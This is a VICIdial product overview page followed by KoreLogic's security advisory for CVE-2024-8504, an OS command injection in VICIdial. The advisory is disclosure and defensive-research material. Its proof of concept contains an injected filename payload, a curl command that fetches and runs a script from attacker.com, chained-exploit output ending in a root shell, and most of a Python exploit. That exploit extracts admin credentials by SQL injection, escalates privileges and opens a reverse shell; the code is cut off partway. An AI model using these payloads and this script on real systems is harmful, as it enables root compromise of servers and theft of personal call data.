=== Content from www.vicidial.org_d785da79_20250111_040220.html ===


| [vicidial.org](./) | | **VICIDIAL** |
| --- | --- | --- |
| codebar |
|  |  | **VICIDIAL Contact Center Suite -**  [click for an enlarged screenshot](./images/VICIDIAL_agent_2.0.5.gif)   **The VICIDIAL project is maintained by the [VICIDIAL Group](http://www.vicidial.com).**  **More VICIDIAL-related links:**  * [the project website](http://astguiclient.sf.net/)* [the commercial website](http://www.vicidial.com)* [the hosted service website](http://www.vicihost.com)* [the VICIdial Whitepaper](https://www.vicidial.com/?page_id=656)* [demo administration site](demo.php)* [Download the LiveCD ISO of ViciDial to try for yourself](http://www.vicibox.com/)* [VICIDIAL Forums](http://www.vicidial.org/VICIDIALforum/index.php)* [VICIDIAL Wiki](http://wiki.vicidial.org)* [VICIDIAL Issue Tracker](http://www.vicidial.org/VICIDIALmantis)* [download the VICIDIAL Brochure](http://www.vicidial.org/vicidial_brochure_sheet.pdf) (PDF)* [A case-study presentation](http://www.vicidial.org/presentations/Astricon2005_matt_florell_PDF.pdf) about a large VICIDIAL installation* [Sample VICIDIAL reports](http://www.vicidial.org/VICIDIALreports/)* [VICIDIAL Agent Manual](http://www.vicidial.org/store.php)* [VICIDIAL Manager Manual](http://www.vicidial.org/store.php#MANAGER)* [Click here download (svn revision 3344 [2021-01-22])](https://sourceforge.net/projects/astguiclient/files/astguiclient_svn-trunk-rev-3344.zip/download)* [Click here to download the latest VICIdial svn/trunk nightly snapshots](https://www.vicidial.org/svn_trunk_nightly/)* [Development Twitter feed](https://twitter.com/vicidial_dev)   VICIDIAL is a software suite that is designed to interact with the Asterisk Open-Source PBX Phone system to act as a complete inbound/outbound contact center suite with inbound email support as well.  The agent interface is an interactive set of web pages that work through a web browser to give real-time information and functionality with nothing more than an internet browser on the client computer.  The management interface is also web-based and offers the ability to view many real-time and summary reports as well as many detailed campaign and agent options and settings.  VICIDIAL can function as an ACD for inbound calls or for Closer calls coming from VICIDIAL outbound fronters and even allows for remote agents logging in from remote locations as well as remote agents that may only have a phone.  There are currently over 24,000 installations of VICIDIAL in production in over 100 countries around the world, several with over 300 agent seats and many with multiple locations.  The software suite also includes a from-scratch software installation document, full English and Spanish versions of the web-clients and admin pages(and functional versions of several other languages), and is designed to work with an Asterisk system that has Zap/DAHDI(T1/E1/PSTN) telco lines or VOIP(IAX or SIP) trunks and many different kinds of softphones and hardphones. This group of applications is designed to run on top of almost any version of Asterisk so no messing around with the Asterisk source code is necessary. For more information see the system requirements at the bottom of the page.  **MAJOR VICIDIAL FEATURES:**  * Inbound, Outbound and Blended call handling and Inbound Email handling* Outbound agent-controlled, broadcast and predictive dialing* Full USA, Canada and UK reegulatory compliance capability* Web-based agent and administrative interfaces* Ability to have agents operate remotely* Integrated call recording* Three-Way calling within the agent application* Scheduled Callbacks: Agent-Only and Anyone* Web-configurable IVRs and Voicemail boxes* Scalable to hundreds of seats* Ability to use standard Telco lines and VOIP trunks* Open-Source AGPLv2 licensed, with no software licensing cost   **Full Features List:**  * Ability for an agent to call clients in succession from a database through a web-client* Ability to display a script for the agent to read with fields like name, address, etc. filled-in* Ability to set a campaign to auto-dial and send live calls to available agents* Ability to dial predictively in a campaign with an adaptive dialing algorithm* Ability to dial on a single campaign across multiple Asterisk servers, or multiple campaigns on a single server* Ability to transfer calls with customer data to a closer/verifier on the local system or a remote Asterisk server* Ability to open a custom web page with user data from the call, per campaign* Ability to autodial campaigns to start with a simple IVR then direct to agent* Ability to broadcast dial to customers with a pre-recorded message* Ability to park the customer with custom music per campaign* Ability to send a dropped call to a voicemail box, queue or extension per campaign if no agent is available* Ability to set outbound CallerID per campaign or per list* Ability to take inbound calls gathering CallerID* Ability to function as an ACD for inbound and fronter/closer verification calls* Ability to have an agent take both inbound and outbound calls in one session(blended)* Ability to start and stop recording an agent's calls at any time* Ability to automatically record all calls* Ability to manually or automatically call upto two other customer numbers for the same lead* Automatically dial unlimited alternate numbers per customer until you get an answer* Ability to schedule a callback with a customer as either any-agent or agent-specific* Ability in Manual dial mode to preview leads before dialing* Ability for agents to be logged in remotely anywhere with just a phone and a web browser* Faster hangup and dispositioning of calls with one key press (HotKeys)* Definable Agent Wrapup-time per campaign* Ability to add custom call dispositions per campaign* Ability to use custom database queries in campaign dialing* Recycling of specified status calls at a specified interval without resetting a list* Dialing with custom TimeZone restrictions including per state and per day-of-the-week* Dialing with Answering Machine Detection, also playing a message for AM calls* Multiple campaigns and lead-lists are possible* Option of a drop timer with safe-harbor message for FTC compliance* Variable drop call percentage when dialing predictively for FTC compliance* System-wide and per-campaign DNC lists that can optionally be activated per campaign* All calls are logged and statuses of calls are logged as well as agent time breakdowns* Load Balancing of call across multiple inbound or outbound Asterisk servers is possible* Agent phone login balancing and failover across multiple ViciDial servers* Several real-time and summary reports available* Real-time campaign display screens* 3rd party conferencing(with DTMF macros and number presets)* 3rd party blind call transfer* 3rd party conferencing with agent drop-off* Custom Music-On-Hold and agent alert sound for inbound calls* Estimated hold time, place in line, overflow queues and several other inbound-only features* Skills-based ranking and call routing per inbound group(queues) and campaign* Queue Prioritization per campaign and inbound group* Single agent call queueing* Ability to set user levels and permissions for certain features and campaigns* Ability for managers to listen-in on agent conversations* Ability for managers to enter conversations with agents and customers* Ability for managers to change the selected queues for an agent* Ability for agents to select a Pause Code when they are not active* Ability for agents to control volume levels and mute themselves* Ability for agents to view the statuses of other agents on the system* Ability for agents to view details for calls in queue that the agent is selected to take calls from* Ability for agents to select and click to take calls in queue from their agent screen* Agent shift enforcement by day and time, defined per user group* Full QueueMetrics-compatible call logging, inbound and outbound* Several Vtiger integration features: user-sync, account-sync, data interconnection* Full integration with Sangoma Call Progress Detection(CDP) for better Answering Machine Detection(AMD)* Multi-function web-based agent API allowing for control of agent sessions including click-to-dial outside of the agent screen* Lead import web-based API* Web-based data export utilities* Separate Time-clock application to track user work time* Web-based administration* DID, phone and carrier trunk provisioning through the web interface* Client web-app web pages available in English, Spanish, Greek, German, French, Italian, Polish, Portuguese, Brazilian Portuguese, Slovak, Russian, Dutch, Swedish, Traditional Chinese, Danish and Japanese.* Admin web pages available in English, Spanish, Greek, German, Italian, French and Brazilian Portuguese.  ***- Requires:** The server elements require an Asterisk server(we support Asterisk versions 1.2, 1.4, 1.8, 11 and 13 [13 is preferred]), Zap(DAHDI),IAX or SIP trunks and SIP/IAX/Zap phones, MySQL 5.0 or greater database server (local or remote)[MariaDB is preferred], Apache and PHP 5.0 or greater (local or remote), Perl with a few dozen CPAN modules installed. We recommend using Google Chrome or Firefox for the web-clients, but they will also run on InternetExplorer 6+, Mozilla 1.7+, Netscape 8+ and Opera 8.5+.* ***- License:** AGPLv2* |
| | [**ASTERISK SYSTEMS**](hardware.php) | | --- | |  | | **VICIDIAL Links** | | [**- VICIDIAL Information**](vicidial.php) | | [**- VICIDIAL Manuals**](store.php) | | [**- VICIDIAL Forum**](http://www.vicidial.org/VICIDIALforum) | | [**- VICIDIAL Wiki**](http://wiki.vicidial.org) | | [**- VICIDIAL Tracker**](http://www.vicidial.org/VICIDIALmantis) | | [**- VICIDIAL Training**](training.php) | | [**- VICIDIAL Demo**](demo.php) | |  | | [**DOWNLOADS**](downloads.php) | |  | | [**COMPANY INFO**](company_info.php) | |  | | [**CONTACT US**](contact_us.php) | |  | | [**CONSULTING**](consulting.php) | |  | | [**PRESENTATIONS**](presentations.php) | |  | | Copyright Â©2024 Vicidial Group | |  | | |

![](./images/blank.gif)



=== Content from korelogic.com_c44a8d19_20250111_040220.html ===
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
KL-001-2024-012: VICIdial Authenticated Remote Code Execution
Title: VICIdial Authenticated Remote Code Execution
Advisory ID: KL-001-2024-012
Publication Date: 2024-09-10
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-012.txt
1. Vulnerability Details
Affected Vendor: VICIdial
Affected Product: VICIdial
Affected Version: 2.14-917a
Platform: GNU/Linux
CWE Classification: CWE-78: Improper Neutralization of Special
Elements used in an OS Command
('OS Command Injection')
CVE ID: CVE-2024-8504
2. Vulnerability Description
An attacker with authenticated access to VICIdial as an "agent"
can execute arbitrary shell commands as the "root" user. This
attack can be chained with CVE-2024-8503 to execute arbitrary
shell commands starting from an unauthenticated perspective.
3. Technical Description
VICIdial is an open-source contact center suite, mainly used
by call centers. The "vicidial.com" website boasts over 14,000
registered installations. There is a public SVN repository to
access the source code, as well as an ISO that can be used to
install the software. The ISO was used in a virtual machine
for testing purposes.
Users can be added to specific "groups" that enable them to log
into the "agent" web client if that group is associated with a
"campaign". This web client is for agents to manage inbound
and outbound phone calls, displaying pertinent information
regarding the "lead", such as the personal information of the
individual on the other end of the call.
An agent has the ability to record the phone call using the
"START RECORDING" button. When clicked, an HTTP request is sent
to the server which is processed by the "manager\_send.php"
PHP script. The "filename" parameter included in the request
is sanitized with the "preg\_replace" PHP function to prevent
SQL injection, as shown by this snippet:
if (isset($\_GET["filename"])) {$filename=$\_GET["filename"];}
elseif (isset($\_POST["filename"])) {$filename=$\_POST["filename"];}
...
$filename = preg\_replace("/\'|\"|\\\\|;/","",$filename);
The regular expression used to sanitize this parameter is
very permissive, only removing single quotes, double quotes,
backslashes, and semicolons.
Later in the execution of "manager\_send.php", the "filename"
variable is added to a SQL database through an "INSERT"
statement, along with other user-controlled variables such as
"exten":
$stmt="INSERT INTO vicidial\_manager values('','','$NOW\_TIME',
'NEW','N','$server\_ip','','Originate','$vmgr\_callerid',
'Channel: $channel','Context: $ext\_context',
'Exten: $exten','Priority: $ext\_priority',
'Callerid: $filename','','','','','');";
if ($format=='debug') {echo "\n";}
$rslt=mysql\_to\_mysqli($stmt, $link);
On the server-side, an asyncronous cron job is executing the
perl script "ADMIN\_keepalive\_ALL.pl":
vicibox11:/ # crontab -l | grep keepalive
### keepalive script for astguiclient processes
\* \* \* \* \* /usr/share/astguiclient/ADMIN\_keepalive\_ALL.pl
This perl script ensures several worker perl scripts
are running. Included in these worker perl scripts is
"AST\_manager\_send.pl", as shown by this snippet from
"ADMIN\_keepalive\_ALL.pl":
if ($psline[1] =~ /AST\_manager\_se/)
{
$runningAST\_send++;
if ($DB) {print "AST\_send RUNNING: |$psline[1]|\n";}
}
...
if ( ($AST\_send\_listen > 0) && ($runningAST\_send < 1) )
{
if ($DB) {print "starting AST\_manager\_send...\n";}
# add a '-L' to the command below to activate logging
`/usr/bin/screen -d -m -S ASTsend
$PATHhome/AST\_manager\_send.pl $debug\_string`;
The "AST\_manager\_send.pl" script will continuously monitor the
"vicidial\_manager" table in the SQL database for records with
the "status" column equal the string "NEW". Values from that
row are then URL-encoded and used as command-line arguments
to invoke the "AST\_send\_action\_child.pl" perl script:
while ($endless\_loop > 0)
{
my $stmtA = "SELECT count(\*) from
vicidial\_manager where server\_ip = '"
. $conf{VARserver\_ip} . "' and status = 'NEW';";
...
$originate\_command .= $vdm->{cmd\_line\_e} . "\n"
if ($vdm->{cmd\_line\_e});
$originate\_command .= $vdm->{cmd\_line\_f} . "\n"
if ($vdm->{cmd\_line\_f});
$originate\_command .= $vdm->{cmd\_line\_g} . "\n"
if ($vdm->{cmd\_line\_g});
...
$vdm->{cmd\_line\_e} =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
$vdm->{cmd\_line\_f} =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
$vdm->{cmd\_line\_g} =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
...
$launch .= " --cmd\_line\_e=" . $vdm->{cmd\_line\_e}
if ($vdm->{cmd\_line\_e});
$launch .= " --cmd\_line\_f=" . $vdm->{cmd\_line\_f}
if ($vdm->{cmd\_line\_f});
$launch .= " --cmd\_line\_g=" . $vdm->{cmd\_line\_g}
if ($vdm->{cmd\_line\_g});
...
$launch .= " >> " . $conf{PATHlogs} . "/action\_send." . logDate()
if ($SYSLOG);
system($launch . ' &');
The "AST\_send\_action\_child.pl" will then initiate a telnet
connection to the "Asterisk Call Manager" and issue various
commands as they appear in the command-line arguments:
my $tn = new Net::Telnet (Port => $telnet\_port,
Prompt => '/\r\n/',
Output\_record\_separator => '',
Errmode => "return");
...
$tn->open("$telnet\_host");
$tn->waitfor('/Asterisk Call Manager\//');
...
$originate\_command .= $cmd\_line\_e . "\n" if ($cmd\_line\_e);
$originate\_command .= $cmd\_line\_f . "\n" if ($cmd\_line\_f);
$originate\_command .= $cmd\_line\_g . "\n" if ($cmd\_line\_g);
...
my @list\_channels = $tn->cmd(String => $originate\_command,
Prompt => '/.\*/');
These commands are then processed by the Asterisk
Management interface (AMI). The configuration file
"extensions-vicidial.conf" contains useful information on
how AMI processes the value of the user-controlled "Exten"
command. The following is a relevant snippet:
exten => 8309,1,Answer
exten => 8309,2,Monitor(wav,${CALLERID(name)})
exten => 8309,3,Wait(3600)
exten => 8309,4,Hangup()
...
When supplying an "Exten" value of "8309", the "Monitor"
application is invoked, which will record the current call and
write the recorded data into a file. The default directory
is "/var/spool/asterisk/monitor". In this case, the name
of the file is derived from the "CALLERID", which is also
user-controlled.
This can be leveraged by an attacker to write file names
that contain malicious shell commands. Take for example the
following HTTP request:
POST /agc/manager\_send.php HTTP/1.1
Host: REDACTED
Content-Length: 279
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
server\_ip=REDACTED&session\_name=1716765726\_8300defaul17394646&user=korelogic&pass=korelogic&ACTION=MonitorConf&format=text&channel=Local/58600051@default&filename=3133731337$(id>foobar.txt)&exten=8309&ext\_context=default&lead\_id=&ext\_priority=1&FROMvdc=YES&uniqueid=&FROMapi=
Two files are created within the "/var/spool/asterisk/monitor"
directory:
vicibox11:/ # ls -l /var/spool/asterisk/monitor
total 216
-rw-r--r-- 1 root root 213164 May 30 05:30 \
3133731337$(id>foobar.txt)-in.wav
-rw-r--r-- 1 root root 44 May 30 05:30 \
3133731337$(id>foobar.txt)-out.wav
Additionally, the "AST\_CRON\_audio\_1\_move\_VDonly.pl" perl script
is executed every 3 minutes:
vicibox11:/ # crontab -l | grep VDonly
0,3,6,9,12,15,18,21,24,27,30,33,36,39,42,45,48,51,54,57 \* \* \* \* \
/usr/share/astguiclient/AST\_CRON\_audio\_1\_move\_VDonly.pl
This script searches for WAV/GSM files within the Asterisk
monitor directory and uses the file names to execute several
shell commands:
foreach(@FILES)
{
...
$INfile = $FILES[$i];
...
if (!$T)
{
`mv -f "$dir1/$INfile" "$dir2/$ALLfile"`;
`rm -f "$dir1/$OUTfile"`;
}
The malicious file name is then inserted into the "mv"
command. The attacker controlled "id" command is executed and
the output is redirected to the file "foo.txt":
vicibox11:/ # ls -l /root/foobar.txt
-rw-r--r-- 1 root root 39 May 30 05:33 /root/foobar.txt
4. Mitigation and Remediation Recommendation
This issue has been remediated in the public svn/trunk codebase,
as of revision 3848 committed 2024-07-08.
5. Credit
This vulnerability was discovered by Jaggar Henry of KoreLogic,
Inc.
6. Disclosure Timeline
2024-07-05 : KoreLogic requests security contact from
support@vicidial.com.
2024-07-08 : KoreLogic reports vulnerability details to VICIdial
contact.
2024-07-08 : VICIdial notifies KoreLogic that the issue has been
remediated with revision 3848 in the public
Subversion repository.
2024-07-11 : KoreLogic confirms this vulnerability has been
remediated. KoreLogic asks VICIdial if it is
appropriate to publicly disclose the vulnerability
details at this time.
2024-07-11 : VICIdial requests four weeks of embargo in order to
upgrade supported customers.
2024-08-05 : KoreLogic asks VICIdial if it is appropriate to
publicly disclose the vulnerability details at
this time.
2024-08-09 : VICIdial requests an additional two weeks of
embargo.
2024-09-10 : KoreLogic public disclosure.
7. Proof of Concept
Instead of executing the "id" command, a malicious bash script
can be downloaded and executing using the cURL utility. The following
file name is an example:
$(curl$IFS@attacker.com$IFS-o$IFS.c&&bash$IFS.c)
This issue can be chained with KL-001-2024-011 (unauthenticated SQL injection)
to execute arbitrary shell commands as the root user from an unauthenticated
perspective:
[goon@security exploits]$ python unauth2rce.py -rh 192.168.2.136 -rp 443 -wh 192.168.2.65 -wp 3000 -lh 192.168.2.65 -lp 1337 --bind
[+] Target appears vulnerable to time-based SQL injection
[~] Enumerating administrator credentials
[~] 6
[~] 66
[~] 666
[~] 6666
[+] Username: 6666
[~] J
[~] JA
[~] JAB
[~] JAB1
[~] JAB18
[~] JAB181
[~] JAB181M
[~] JAB181MA
[~] JAB181MAB
[~] JAB181MAB1
[~] JAB181MAB17
[~] JAB181MAB178
[~] JAB181MAB178\_
[~] JAB181MAB178\_L
[~] JAB181MAB178\_LA
[~] JAB181MAB178\_LAn
[+] Password: JAB181MAB178\_LAn
[+] Authenticated successfully as user "6666"
[+] Updated user settings to increase privileges
[+] Updated system settings
[+] Created dummy campaign "korelogic\_campaign"
[+] Updated dummy campaign settings
[+] Created dummy list for campaign
[+] Found phone credentials: callin:test
[+] Entered "manager" credentials to override shift enforcement
[+] Authenticated as agent using phone credentials
[~] Listening for incoming connections...
[+] Received cURL request from 192.168.2.136
Connection from 192.168.2.136:56980
vicibox11:~ # id
uid=0(root) gid=0(root) groups=0(root)
#########################
## unauth2rce.py ##
#########################
import os
import re
import socket
import string
import random
import urllib3
import argparse
import requests
import threading
from base64 import b64encode
from bs4 import BeautifulSoup
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
class Exploit:
def \_\_init\_\_(self, rhost, rport, whost, wport, lhost=None, lport=None, bind=False, proxy=None):
"""
This 'sleep' duration is derived by the average response time
multiplied by this value. A server with an average response time
of 10ms is given a 'sleep' duration of 300ms. Tune as needed.
"""
self.SLEEP\_MULTIPLIER = 30
self.REQUEST\_HEADERS = {'User-Agent': 'KoreLogic'}
self.ALLOWED\_SCHEMES = ['http', 'https']
if proxy:
self.REQUEST\_PROXIES = {
'http': proxy,
'https': proxy
}
else:
self.REQUEST\_PROXIES = {}
self.TARGET\_IP = rhost
self.TARGET\_PORT = rport
self.PAYLOAD\_WEBSERVER\_HOST = whost
self.PAYLOAD\_WEBSERVER\_PORT = wport
self.REVERSE\_SHELL\_HOST = lhost
self.REVERSE\_SHELL\_PORT = lport
self.BIND = bind
self.VICIDIAL\_FINGERPRINT = 'Please Hold while I redirect you!'
self.RANDOM\_CHARSET = string.ascii\_uppercase + string.digits
# returns a URI with 'http' or 'https'
def determine\_target\_uri(self):
for scheme in self.ALLOWED\_SCHEMES:
target\_uri = f'{scheme}://{self.TARGET\_IP}:{self.TARGET\_PORT}'
try:
response = requests.get(target\_uri, headers=self.REQUEST\_HEADERS, verify=False)
if self.VICIDIAL\_FINGERPRINT in response.text:
return target\_uri
except:
pass
# returns a session object with custom proxies/headers if supplied
def build\_requests\_session(self):
self.base\_uri = self.determine\_target\_uri()
session = requests.Session()
session.proxies = self.REQUEST\_PROXIES
session.verify = False
return session
# returns a random string of a given length
def random(self, length):
return ''.join(random.choice(self.RANDOM\_CHARSET) for \_ in range(length))
# returns a timedelta representing the response time of an injected SQL query
def time\_sql\_query(self, query, session):
username = f"goolicker', '', ({query}));# "
credentials = f'{username}:password'
credentials\_base64 = b64encode(credentials.encode()).decode()
auth\_header = f'Basic {credentials\_base64}'
target\_uri = f'{self.base\_uri}/VERM/VERM\_AJAX\_functions.php'
request\_params = {'function': 'log\_custom\_report', self.random(5): self.random(5)}
request\_headers = {\*\*self.REQUEST\_HEADERS, 'Authorization': auth\_header}
response = session.get(target\_uri, params=request\_params, headers=request\_headers)
return response.elapsed
# returns a boolean if time-based SQL injection is possible, additionally
# sets the best 'sleep' duration based on response times
def is\_vulnerable(self, session, baseline\_iterations=5):
# determine average baseline response time
zero\_sleep\_query = f'SELECT (NULL)'
total\_baseline\_time = 0
for \_ in range(baseline\_iterations):
execution\_time = self.time\_sql\_query(zero\_sleep\_query, session)
total\_baseline\_time += execution\_time.total\_seconds()
average\_baseline\_response\_time = total\_baseline\_time / baseline\_iterations
self.sql\_baseline\_time = average\_baseline\_response\_time
# determine if injected sleep query impacts response time
sleep\_length = round(average\_baseline\_response\_time \* self.SLEEP\_MULTIPLIER, 2)
sleep\_query = f'SELECT (sleep({sleep\_length}))'
execution\_time = self.time\_sql\_query(sleep\_query, session)
if execution\_time.total\_seconds() >= sleep\_length:
self.sql\_sleep\_length = sleep\_length
return True
else:
return False
# determine if a character at a specific indice of a query result returns a
# boolean 'true' when compared to a given character using the supplied operator
def check\_indice\_of\_query\_result(self, session, query, indice, operator, ordinal):
parent\_query = f'SELECT IF(ORD((SUBSTRING(({query}), {indice}, {indice}))){operator}{ordinal}, sleep({self.sql\_sleep\_length}), null)'
execution\_time = self.time\_sql\_query(parent\_query, session)
return execution\_time.total\_seconds() >= (self.sql\_baseline\_time \* self.SLEEP\_MULTIPLIER)
def enumerate\_sql\_query(self, session, query='SELECT @@version', charset=string.printable):
# convert charset to ordinals
all\_characters = sorted([ord(char) for char in charset])
reduced\_characters = all\_characters
# use a binary search and enumerate query results
result = ''
indice = 1
indice\_could\_be\_null = True
while True:
"""
we check if the value is NULL once per indice
to determine when a string ends. this adds one
request per indice, but since every boolean 'true'
results in a delay this is faster than counting
the length of the string before enumrating.
"""
if indice\_could\_be\_null:
if self.check\_indice\_of\_query\_result(session, query, indice, '=', '0'):
break
else:
indice\_could\_be\_null = False
# enumerate each character of query result with a binary search
middle\_indice = len(reduced\_characters) // 2
middle\_ordinal = reduced\_characters[middle\_indice]
if self.check\_indice\_of\_query\_result(session, query, indice, '<=', middle\_ordinal):
if self.check\_indice\_of\_query\_result(session, query, indice, '=', middle\_ordinal):
reduced\_characters = all\_characters
result += chr(middle\_ordinal)
indice += 1
indice\_could\_be\_null = True
print(f'[~] {result}')
else:
reduced\_characters = reduced\_characters[:middle\_indice]
else:
reduced\_characters = reduced\_characters[middle\_indice:]
return result
def poison\_recording\_files(self, session, username, password):
# authenticate using administrator credentials
credentials = f'{username}:{password}'
credentials\_base64 = b64encode(credentials.encode()).decode()
auth\_header = f'Basic {credentials\_base64}'
target\_uri = f'{self.base\_uri}/vicidial/admin.php'
request\_params = {'ADD': '3', 'user': username}
request\_headers = {\*\*self.REQUEST\_HEADERS, 'Authorization': auth\_header}
response = session.get(target\_uri, params=request\_params, headers=request\_headers)
if response.status\_code == 200:
print(f'[+] Authenticated successfully as user "{username}"')
else:
print('[-] Failed to authenticate with credentials. Maybe hashing is enabled?')
return
# update user settings to increase privileges beyond default administrator
user\_settings\_body = {
"ADD":"4A","custom\_fields\_modify":"0","user":username,"DB":"0","pass":password,
"force\_change\_password":"N","full\_name":"KoreLogic","user\_level":"9",
"user\_group":"ADMIN","phone\_login":"KoreLogic","phone\_pass":"KoreLogic",
"active":"Y","voicemail\_id":"","email":"","mobile\_number":"","user\_code":"",
"user\_location":"","user\_group\_two":"","territory":"","user\_nickname":"",
"user\_new\_lead\_limit":"-1","agent\_choose\_ingroups":"1","agent\_choose\_blended":"1",
"hotkeys\_active":"0","scheduled\_callbacks":"1","agentonly\_callbacks":"0",
"next\_dial\_my\_callbacks":"NOT\_ACTIVE","agentcall\_manual":"0","manual\_dial\_filter":"DISABLED",
"agentcall\_email":"0","agentcall\_chat":"0","vicidial\_recording":"1","vicidial\_transfers":"1",
"closer\_default\_blended":"0","user\_choose\_language":"0","selected\_language":"default+English",
"vicidial\_recording\_override":"DISABLED","mute\_recordings":"DISABLED",
"alter\_custdata\_override":"NOT\_ACTIVE","alter\_custphone\_override":"NOT\_ACTIVE",
"agent\_shift\_enforcement\_override":"ALL","agent\_call\_log\_view\_override":"Y",
"hide\_call\_log\_info":"Y","agent\_lead\_search":"NOT\_ACTIVE","lead\_filter\_id":"NONE",
"user\_hide\_realtime":"0","allow\_alerts":"0","preset\_contact\_search":"NOT\_ACTIVE",
"max\_inbound\_calls":"0","max\_inbound\_filter\_enabled":"0","max\_inbound\_filter\_min\_sec":"-1",
"inbound\_credits":"-1","max\_hopper\_calls":"0","max\_hopper\_calls\_hour":"0",
"wrapup\_seconds\_override":"-1","ready\_max\_logout":"-1","status\_group\_id":"",
"campaign\_js\_rank\_select":"","campaign\_js\_grade\_select":"","ingroup\_js\_rank\_select":"",
"ingroup\_js\_grade\_select":"","RANK\_AGENTDIRECT":"0","GRADE\_AGENTDIRECT":"10",
"LIMIT\_AGENTDIRECT":"-1","WEB\_AGENTDIRECT":"","RANK\_AGENTDIRECT\_CHAT":"0",
"GRADE\_AGENTDIRECT\_CHAT":"10","LIMIT\_AGENTDIRECT\_CHAT":"-1","WEB\_AGENTDIRECT\_CHAT":"",
"custom\_one":"","custom\_two":"","custom\_three":"","custom\_four":"","custom\_five":"",
"qc\_enabled":"0","qc\_user\_level":"1","qc\_pass":"0","qc\_finish":"0","qc\_commit":"0",
"hci\_enabled":"0","realtime\_block\_user\_info":"0","admin\_hide\_lead\_data":"0",
"admin\_hide\_phone\_data":"0","ignore\_group\_on\_search":"0","user\_admin\_redirect\_url":"",
"view\_reports":"1","access\_recordings":"0","alter\_agent\_interface\_options":"1",
"modify\_users":"1","change\_agent\_campaign":"1","delete\_users":"1","modify\_usergroups":"1",
"delete\_user\_groups":"1","modify\_lists":"1","delete\_lists":"1","load\_leads":"1",
"modify\_leads":"1","export\_gdpr\_leads":"0","download\_lists":"1","export\_reports":"1",
"delete\_from\_dnc":"1","modify\_campaigns":"1","campaign\_detail":"1","modify\_dial\_prefix":"1",
"delete\_campaigns":"1","modify\_ingroups":"1","delete\_ingroups":"1","modify\_inbound\_dids":"1",
"delete\_inbound\_dids":"1","modify\_custom\_dialplans":"1","modify\_remoteagents":"1",
"delete\_remote\_agents":"1","modify\_scripts":"1","delete\_scripts":"1","modify\_filters":"1",
"delete\_filters":"1","ast\_admin\_access":"1","ast\_delete\_phones":"1","modify\_call\_times":"1",
"delete\_call\_times":"1","modify\_servers":"1","modify\_shifts":"1","modify\_phones":"1",
"modify\_carriers":"1","modify\_email\_accounts":"0","modify\_labels":"1","modify\_colors":"1",
"modify\_languages":"0","modify\_statuses":"1","modify\_voicemail":"1","modify\_audiostore":"1",
"modify\_moh":"1","modify\_tts":"1","modify\_contacts":"1","callcard\_admin":"1",
"modify\_auto\_reports":"0","add\_timeclock\_log":"1","modify\_timeclock\_log":"1",
"delete\_timeclock\_log":"1","manager\_shift\_enforcement\_override":"1","pause\_code\_approval":"1",
"admin\_cf\_show\_hidden":"0","modify\_ip\_lists":"0","ignore\_ip\_list":"0",
"two\_factor\_override":"NOT\_ACTIVE","vdc\_agent\_api\_access":"1","api\_list\_restrict":"0",
"api\_allowed\_functions%5B%5D":"ALL\_FUNCTIONS","api\_only\_user":"0","modify\_same\_user\_level":"1",
"download\_invalid\_files":"1","alter\_admin\_interface\_options":"1","SUBMIT":"SUBMIT"
}
response = session.post(target\_uri, headers=request\_headers, data=user\_settings\_body)
print('[+] Updated user settings to increase privileges')
# update system settings without clobbering existing configuration
response = session.get(target\_uri, headers=request\_headers, params={'ADD':'311111111111111'})
soup = BeautifulSoup(response.text, 'html.parser')
form\_tag = soup.find('form')
system\_settings\_body = {}
for input\_tag in form\_tag.find\_all('input'):
setting\_name = input\_tag['name']
setting\_value = input\_tag['value']
system\_settings\_body[setting\_name] = setting\_value
for select\_tag in form\_tag.find\_all('select'):
setting\_name = select\_tag['name']
selected\_tag = select\_tag.find('option', selected=True)
if not selected\_tag:
continue
setting\_value = selected\_tag.text
system\_settings\_body[setting\_name] = setting\_value
system\_settings\_body['outbound\_autodial\_active'] = '0'
response = session.post(target\_uri, headers=request\_headers, data=system\_settings\_body)
print('[+] Updated system settings')
# create dummy campaign
campaign\_settings\_body = {
"ADD":"21","park\_ext":"","campaign\_id":"313373","campaign\_name":"korelogic\_campaign",
"campaign\_description":"","user\_group":"---ALL---","active":"Y","park\_file\_name":"",
"web\_form\_address":"","allow\_closers":"Y","hopper\_level":"1","auto\_dial\_level":"0",
"next\_agent\_call":"random","local\_call\_time":"12pm-5pm","voicemail\_ext":"","script\_id":"",
"get\_call\_launch":"NONE","SUBMIT":"SUBMIT"
}
response = session.post(target\_uri, headers=request\_headers, data=campaign\_settings\_body)
print('[+] Created dummy campaign "korelogic\_campaign"')
# update dummy campaign
update\_campaign\_body = {
"ADD":"41","campaign\_id":"313373","old\_campaign\_allow\_inbound":"Y",
"campaign\_name":"korelogic\_campaign","active":"Y","dial\_status":"","lead\_order":"DOWN",
"list\_order\_mix":"DISABLED","lead\_filter\_id":"NONE", "no\_hopper\_leads\_logins":"Y",
"hopper\_level":"1","reset\_hopper":"N","dial\_method":"RATIO","auto\_dial\_level":"1",
"adaptive\_intensity":"0","SUBMIT":"SUBMIT","form\_end":"END"
}
response = session.post(target\_uri, headers=request\_headers, data=update\_campaign\_body)
print('[+] Updated dummy campaign settings')
# create dummy list
list\_settings\_body = {
"ADD":"211","list\_id":"313374","list\_name":"korelogic\_list","list\_description":"",
"campaign\_id":"313373","active":"Y","SUBMIT":"SUBMIT"
}
response = session.post(target\_uri, headers=request\_headers, data=list\_settings\_body)
print('[+] Created dummy list for campaign')
# fetch credentials for a phone login
response = session.get(target\_uri, headers=request\_headers, params={'ADD':'10000000000'})
soup = BeautifulSoup(response.text, 'html.parser')
phone\_uri\_path = soup.find('a', string='MODIFY')['href']
response = session.get(f'{self.base\_uri}{phone\_uri\_path}', headers=request\_headers)
soup = BeautifulSoup(response.text, 'html.parser')
phone\_extension = soup.find('input', {'name': 'extension'})['value']
phone\_password = soup.find('input', {'name': 'pass'})['value']
recording\_extension = soup.find('input', {'name': 'recording\_exten'})['value']
print(f'[+] Found phone credentials: {phone\_extension}:{phone\_password}')
# authenticate to agent portal with phone credentials
manager\_login\_body = {
"DB":"0","JS\_browser\_height":"1313","JS\_browser\_width":"2560","phone\_login":phone\_extension,
"phone\_pass":phone\_password,"LOGINvarONE":"","LOGINvarTWO":"","LOGINvarTHREE":"","LOGINvarFOUR":"",
